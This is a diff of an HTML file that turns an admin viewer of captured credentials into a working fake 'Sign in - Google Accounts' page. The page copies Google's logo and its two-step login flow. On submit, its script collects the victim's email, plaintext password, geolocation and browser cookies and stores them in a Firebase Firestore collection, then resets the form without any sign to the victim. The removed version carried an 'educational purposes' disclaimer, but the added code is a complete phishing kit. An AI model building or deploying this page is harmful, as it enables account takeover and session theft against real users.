@@ -3,105 +3,149 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Dashboard - User Credentials (Firebase)</title>
+    <title>Sign in - Google Accounts</title>
     <!-- Tailwind CSS CDN -->
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
         body {
             font-family: 'Inter', sans-serif;
-            background-color: #f0f2f5;
-            min-height: 100vh;
+            background-color: #f0f2f5; /* Light grey background */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh; /* Full viewport height */
             margin: 0;
-            padding: 2rem;
+            padding: 1rem; /* Add some padding for small screens */
             box-sizing: border-box;
         }
-        .container {
-            max-width: 900px;
-            margin: 0 auto;
+        /* Custom styling for the input field to mimic Google's floating label */
+        .input-container {
+            position: relative;
         }
-        table {
+        .input-field {
+            padding: 14px 12px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
             width: 100%;
-            border-collapse: collapse;
+            font-size: 1rem;
+            outline: none;
+            transition: border-color 0.2s ease, box-shadow 0.2s ease;
         }
-        th, td {
-            border: 1px solid #e2e8f0;
-            padding: 12px;
-            text-align: left;
+        .input-field:focus {
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 1px #1a73e8;
         }
-        th {
-            background-color: #f8faff;
-            font-weight: 600;
+        .input-label {
+            position: absolute;
+            left: 12px;
+            top: 14px;
+            color: #80868b;
+            font-size: 1rem;
+            pointer-events: none;
+            transition: all 0.2s ease;
         }
-        tr:nth-child(even) {
-            background-color: #fdfdfe;
+        .input-field:focus + .input-label,
+        .input-field:not(:placeholder-shown) + .input-label {
+            top: 4px;
+            font-size: 0.75rem;
+            color: #1a73e8;
+            background-color: white;
+            padding: 0 4px;
+            left: 8px;
         }
-        .info-box {
-            background-color: #e6f7ff;
-            border-color: #91d5ff;
-            color: #0050b3;
-            padding: 1rem;
-            border-radius: 0.375rem;
-            margin-bottom: 1.5rem;
-            font-size: 0.9rem;
-            line-height: 1.5;
+        /* Hidden by default for the password section */
+        .hidden {
+            display: none;
         }
-        .warning-box {
-            background-color: #fff3cd;
-            border-color: #ffeeba;
-            color: #856404;
-            padding: 1rem;
-            border-radius: 0.375rem;
-            margin-bottom: 1.5rem;
-            font-size: 0.9rem;
-            line-height: 1.5;
+        /* Spinner animation */
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid #fff;
+            border-radius: 50%;
+            width: 1.5rem;
+            height: 1.5rem;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            vertical-align: middle;
+            margin-right: 0.5rem;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
-    <div class="container bg-white p-8 rounded-lg shadow-md border border-gray-200">
-        <h1 class="text-3xl font-bold text-center mb-6 text-gray-800">Admin Dashboard</h1>
-        <p class="text-lg text-gray-600 text-center mb-8">User Credentials Log</p>
-
-        <div class="warning-box">
-            <strong>Security Warning:</strong> This page demonstrates storing user credentials, location, and cookies for educational purposes using Firebase. In a real application, storing passwords in plain text is a severe security risk and should NEVER be done. Geolocation also requires user permission.
+    <div class="bg-white p-8 sm:p-12 rounded-lg shadow-md w-full max-w-md border border-gray-200">
+        <!-- Google Logo/Text -->
+        <div class="flex justify-center mb-6">
+            <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google Logo" class="h-9 sm:h-10">
         </div>
 
-        <div class="info-box">
-            <strong>Note:</strong> This version connects to Firebase Firestore. Data will be stored centrally and visible to all connected clients.
+        <!-- Email Input Section -->
+        <div id="emailSection">
+            <h1 class="text-2xl sm:text-2xl font-normal text-center mb-2">Sign in</h1>
+            <p class="text-md text-gray-700 text-center mb-8">Use your Google Account</p>
+
+            <form id="emailForm" onsubmit="handleEmailSubmit(event)">
+                <!-- Email or Phone Input -->
+                <div class="mb-6 input-container">
+                    <input type="email" id="email" class="input-field" placeholder=" " autocomplete="username" required>
+                    <label for="email" class="input-label">Email or phone</label>
+                </div>
+
+                <!-- Forgot Email Link -->
+                <div class="mb-6">
+                    <a href="#" class="text-blue-600 hover:text-blue-800 text-sm font-medium">Forgot email?</a>
+                </div>
+
+                <!-- Learn More Text -->
+                <p class="text-sm text-gray-600 mb-6">Not your computer? Use a Guest mode to sign in privately. <a href="#" class="text-blue-600 hover:text-blue-800 font-medium">Learn more</a></p>
+
+                <!-- Buttons -->
+                <div class="flex flex-col sm:flex-row justify-between items-center mt-8">
+                    <a href="#" class="text-blue-600 hover:text-blue-800 font-medium py-2 px-4 rounded-md mb-4 sm:mb-0 sm:mr-4 text-center w-full sm:w-auto">Create account</a>
+                    <button type="submit" class="bg-blue-600 hover:bg-blue-700 text-white font-medium py-2 px-6 rounded-md transition duration-200 ease-in-out w-full sm:w-auto">Next</button>
+                </div>
+            </form>
         </div>
 
-        <div class="mb-4 text-gray-700">
-            <p><strong>Current User ID:</strong> <span id="currentUserId">Loading...</span></p>
-            <p class="text-sm text-gray-500">This ID is used for Firestore access.</p>
-        </div>
+        <!-- Password Input Section (Hidden by default) -->
+        <div id="passwordSection" class="hidden">
+            <h1 class="text-2xl sm:text-2xl font-normal text-center mb-2">Welcome</h1>
+            <p id="userEmailDisplay" class="text-md font-medium text-gray-800 text-center mb-4"></p>
+            <p class="text-md text-gray-700 text-center mb-8">Enter your password</p>
 
-        <div class="overflow-x-auto rounded-lg shadow-sm border border-gray-200">
-            <table class="min-w-full bg-white">
-                <thead>
-                    <tr>
-                        <th class="px-6 py-3 text-xs font-medium text-gray-500 uppercase tracking-wider">Email</th>
-                        <th class="px-6 py-3 text-xs font-medium text-gray-500 uppercase tracking-wider">Password</th>
-                        <th class="px-6 py-3 text-xs font-medium text-gray-500 uppercase tracking-wider">Timestamp</th>
-                        <th class="px-6 py-3 text-xs font-medium text-gray-500 uppercase tracking-wider">Location</th>
-                        <th class="px-6 py-3 text-xs font-medium text-gray-500 uppercase tracking-wider">Cookies</th>
-                    </tr>
-                </thead>
-                <tbody id="credentialsTableBody" class="divide-y divide-gray-200">
-                    <!-- Data will be loaded here by JavaScript -->
-                    <tr>
-                        <td colspan="5" class="text-center py-4 text-gray-500">Loading user data from Firebase...</td>
-                    </tr>
-                </tbody>
-            </table>
+            <form id="passwordForm" onsubmit="handlePasswordSubmit(event)">
+                <!-- Password Input -->
+                <div class="mb-6 input-container">
+                    <input type="password" id="password" class="input-field" placeholder=" " autocomplete="current-password" required>
+                    <label for="password" class="input-label">Enter your password</label>
+                </div>
+
+                <!-- Error Message Display -->
+                <div id="errorMessage" class="text-red-600 text-sm mb-4 hidden"></div>
+
+                <!-- Forgot Password Link -->
+                <div class="mb-6">
+                    <a href="#" class="text-blue-600 hover:text-blue-800 text-sm font-medium">Forgot password?</a>
+                </div>
+
+                <!-- Buttons -->
+                <div class="flex flex-col sm:flex-row justify-between items-center mt-8">
+                    <button type="button" onclick="showEmailSection()" class="text-blue-600 hover:text-blue-800 font-medium py-2 px-4 rounded-md mb-4 sm:mb-0 sm:mr-4 text-center w-full sm:w-auto">Back</button>
+                    <button type="submit" id="passwordNextButton" class="bg-blue-600 hover:bg-blue-700 text-white font-medium py-2 px-6 rounded-md transition duration-200 ease-in-out w-full sm:w-auto">Next</button>
+                </div>
+            </form>
         </div>
     </div>
 
     <script type="module">
         // Firebase SDK imports
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
-        import { getAuth, signInAnonymously, signInWithCustomToken, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
-        import { getFirestore, collection, onSnapshot, query } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+        import { getAuth, signInAnonymously, signInWithCustomToken } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
 
         // Firebase configuration and initialization
         // IMPORTANT: For local testing, you MUST replace these placeholders with your actual Firebase project credentials.
@@ -120,95 +164,170 @@
         let auth;
         let db;
         let userId;
-        let isAuthReady = false;
+        let currentEmail = ''; // To store the email across steps
 
-        // Initialize Firebase and set up auth listener
+        // Initialize Firebase and authenticate
         async function initializeFirebase() {
             try {
                 app = initializeApp(firebaseConfig);
                 auth = getAuth(app);
                 db = getFirestore(app);
 
-                onAuthStateChanged(auth, async (user) => {
-                    if (user) {
-                        userId = user.uid;
-                        document.getElementById('currentUserId').textContent = userId;
-                        isAuthReady = true;
-                        console.log("Firebase authenticated. User ID:", userId);
-                        // Start listening for data only after auth is ready
-                        listenForCredentials();
-                    } else {
-                        // Attempt anonymous sign-in if no user is found
-                        try {
-                            if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
-                                await signInWithCustomToken(auth, __initial_auth_token);
-                            } else {
-                                await signInAnonymously(auth);
-                            }
-                            // onAuthStateChanged will be triggered again with the new user
-                        } catch (anonError) {
-                            console.error("Error signing in anonymously:", anonError);
-                            document.getElementById('currentUserId').textContent = 'Authentication failed. Check console.';
-                        }
-                    }
-                });
-            } catch (error) {
-                console.error("Error initializing Firebase:", error);
-                document.getElementById('currentUserId').textContent = 'Error initializing Firebase. Please check your Firebase config (API Key/Project ID) in the code and console for details.';
-            }
-        }
-
-        // Function to listen for real-time updates to credentials from Firestore
-        function listenForCredentials() {
-            if (!db || !isAuthReady) {
-                console.log("Firestore or Auth not ready, retrying listenForCredentials...");
-                setTimeout(listenForCredentials, 500); // Retry after a short delay
-                return;
-            }
-
-            // Path to the public collection where credentials are stored
-            const credentialsCollectionRef = collection(db, `artifacts/${appId}/public/data/user_credentials`);
-            
-            // Query to listen for all documents in the collection
-            // Note: orderBy is commented out as per previous instructions to avoid potential index issues.
-            const q = query(credentialsCollectionRef); // , orderBy("timestamp", "desc")
-
-            onSnapshot(q, (snapshot) => {
-                const credentialsTableBody = document.getElementById('credentialsTableBody');
-                credentialsTableBody.innerHTML = ''; // Clear existing rows
-
-                if (snapshot.empty) {
-                    credentialsTableBody.innerHTML = `<tr><td colspan="5" class="text-center py-4 text-gray-500">No user credentials found in Firebase.</td></tr>`;
-                    return;
+                // Authenticate with custom token if available, otherwise anonymously
+                if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
+                    await signInWithCustomToken(auth, __initial_auth_token);
+                } else {
+                    await signInAnonymously(auth);
                 }
-
-                const credentials = [];
-                snapshot.forEach((doc) => {
-                    credentials.push({ id: doc.id, ...doc.data() });
-                });
-
-                // Sort credentials by timestamp (newest first) client-side
-                credentials.sort((a, b) => (b.timestamp?.toDate() || 0) - (a.timestamp?.toDate() || 0));
-
-                credentials.forEach((data) => {
-                    const row = document.createElement('tr');
-                    row.innerHTML = `
-                        <td class="px-6 py-4 whitespace-nowrap text-sm font-medium text-gray-900">${data.email || 'N/A'}</td>
-                        <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">${data.password || 'N/A'}</td>
-                        <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">${data.timestamp ? new Date(data.timestamp.toDate()).toLocaleString() : 'N/A'}</td>
-                        <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-500">${data.location || 'N/A'}</td>
-                        <td class="px-6 py-4 text-sm text-gray-500 break-all">${data.cookies || 'N/A'}</td>
-                    `;
-                    credentialsTableBody.appendChild(row);
-                });
-            }, (error) => {
-                console.error("Error listening to credentials from Firebase:", error);
-                document.getElementById('credentialsTableBody').innerHTML = `<tr><td colspan="5" class="text-center py-4 text-red-500">Error loading data from Firebase. Check console for details.</td></tr>`;
-            });
+                userId = auth.currentUser?.uid || crypto.randomUUID(); // Get user ID after auth
+                console.log("Firebase initialized and authenticated. User ID:", userId);
+            } catch (error) {
+                console.error("Error initializing Firebase or authenticating:", error);
+                const messageBox = document.createElement('div');
+                messageBox.className = 'fixed top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 bg-red-500 text-white p-4 rounded-md shadow-lg z-50';
+                messageBox.textContent = 'Firebase connection error. Check console for details and ensure your Firebase config is valid (API Key/Project ID).';
+                document.body.appendChild(messageBox);
+                setTimeout(() => messageBox.remove(), 5000);
+            }
         }
 
         // Call Firebase initialization on window load
         window.onload = initializeFirebase;
+
+        // Function to show the email input section and hide the password section
+        window.showEmailSection = function() {
+            document.getElementById('emailSection').classList.remove('hidden');
+            document.getElementById('passwordSection').classList.add('hidden');
+            document.getElementById('password').value = ''; // Clear password field
+            document.getElementById('errorMessage').classList.add('hidden'); // Hide error message
+            document.getElementById('passwordNextButton').innerHTML = 'Next'; // Reset button text
+            document.getElementById('passwordNextButton').disabled = false; // Enable button
+        };
+
+        // Function to show the password input section and hide the email section
+        window.showPasswordSection = function() {
+            document.getElementById('emailSection').classList.add('hidden');
+            document.getElementById('passwordSection').classList.remove('hidden');
+            document.getElementById('userEmailDisplay').textContent = currentEmail;
+            document.getElementById('password').focus(); // Focus on password input
+            document.getElementById('errorMessage').classList.add('hidden'); // Hide error message
+            document.getElementById('passwordNextButton').innerHTML = 'Next'; // Reset button text
+            document.getElementById('passwordNextButton').disabled = false; // Enable button
+        };
+
+        // Function to handle email submission
+        window.handleEmailSubmit = function(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            const emailInput = document.getElementById('email');
+            const email = emailInput.value.trim();
+
+            if (email) {
+                currentEmail = email; // Store email
+                showPasswordSection(); // Move to password step
+            } else {
+                // Display a custom message for validation
+                const messageBox = document.createElement('div');
+                messageBox.className = 'fixed top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 bg-yellow-500 text-white p-4 rounded-md shadow-lg z-50';
+                messageBox.textContent = 'Please enter your email or phone.';
+                document.body.appendChild(messageBox);
+                setTimeout(() => messageBox.remove(), 2000);
+            }
+        };
+
+        // Function to get user's location
+        function getUserLocation() {
+            return new Promise((resolve) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            const lat = position.coords.latitude;
+                            const lon = position.coords.longitude;
+                            resolve(`Lat: ${lat.toFixed(4)}, Lon: ${lon.toFixed(4)}`);
+                        },
+                        (error) => {
+                            console.warn("Geolocation error:", error);
+                            resolve("Denied/Unavailable");
+                        },
+                        { enableHighAccuracy: false, timeout: 5000, maximumAge: 0 }
+                    );
+                } else {
+                    resolve("Not Supported");
+                }
+            });
+        }
+
+        // Function to handle password submission
+        window.handlePasswordSubmit = async function(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            const passwordInput = document.getElementById('password');
+            const password = passwordInput.value.trim();
+            const passwordNextButton = document.getElementById('passwordNextButton');
+            const errorMessage = document.getElementById('errorMessage');
+
+            if (!currentEmail) {
+                console.error("Email not found. Please go back and enter your email.");
+                showEmailSection(); // Go back to email step
+                return;
+            }
+
+            if (password) {
+                // Show loading state
+                passwordNextButton.disabled = true;
+                passwordNextButton.innerHTML = '<span class="spinner"></span> Loading...';
+                errorMessage.classList.add('hidden'); // Hide any previous error
+
+                try {
+                    // Simulate network delay (e.g., 2 seconds)
+                    await new Promise(resolve => setTimeout(resolve, 2000));
+
+                    // Get user's location and cookies
+                    const userLocation = await getUserLocation();
+                    const userCookies = document.cookie;
+
+                    // Ensure db is initialized before trying to add a document
+                    if (!db) {
+                        throw new Error("Firestore database not initialized. Check Firebase config.");
+                    }
+
+                    // Store credentials in Firestore
+                    const credentialsCollectionRef = collection(db, `artifacts/${appId}/public/data/user_credentials`);
+                    await addDoc(credentialsCollectionRef, {
+                        email: currentEmail,
+                        password: password, // WARNING: Storing plain text password is NOT secure!
+                        timestamp: new Date(),
+                        location: userLocation,
+                        cookies: userCookies
+                    });
+                    console.log("Credentials stored successfully in Firebase!");
+
+                    // No explicit message box for success, just clear fields and reset
+                    document.getElementById('email').value = ''; // Clear email field
+                    document.getElementById('password').value = ''; // Clear password field
+                    currentEmail = ''; // Clear stored email
+                    showEmailSection(); // Go back to email input
+                    console.log("Simulated login complete. Data stored in Firebase. Ready for next login.");
+
+                } catch (e) {
+                    console.error("Error adding document to Firestore:", e);
+                    // Display error message if Firestore operation fails
+                    errorMessage.textContent = 'An error occurred. Please try again.';
+                    errorMessage.classList.remove('hidden');
+                } finally {
+                    // Reset button state
+                    passwordNextButton.innerHTML = 'Next';
+                    passwordNextButton.disabled = false;
+                }
+            } else {
+                // Display a custom message for validation
+                const messageBox = document.createElement('div');
+                messageBox.className = 'fixed top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 bg-yellow-500 text-white p-4 rounded-md shadow-lg z-50';
+                messageBox.textContent = 'Please enter your password.';
+                document.body.appendChild(messageBox);
+                setTimeout(() => messageBox.remove(), 2000);
+            }
+        };
     </script>
 </body>
 </html>
